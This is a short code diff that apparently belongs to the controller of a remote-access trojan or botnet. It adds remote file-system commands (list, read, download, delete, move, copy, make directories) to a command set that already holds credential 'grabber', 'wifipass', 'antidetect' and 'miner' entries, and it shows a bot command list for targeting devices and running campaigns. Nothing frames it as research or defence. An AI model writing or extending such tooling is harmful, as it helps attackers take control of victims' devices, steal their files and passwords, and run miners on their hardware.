@@ -108,6 +108,8 @@ export const DEV_CMDS = new Set([
   'update', 'config', 'grabber',
   'wifipass', 'netstat', 'sysinfo', 'antidetect', 'sysprop', 'services', 'apps', 'storage',
   'miner', 'upload',
+  'dir', 'ls', 'tree', 'find', 'cat', 'info', 'disk', 'recent', 'ext', 'download',
+  'rm', 'mv', 'cp', 'mkdir',
 ])
 
 export const BOT_CMDS = ['!help', '!menu', '!devices', '!broadcast', '!target', '!untarget', '!history', '!search', '!miner', '!upload', '!stream', '!ai', '!campaign']
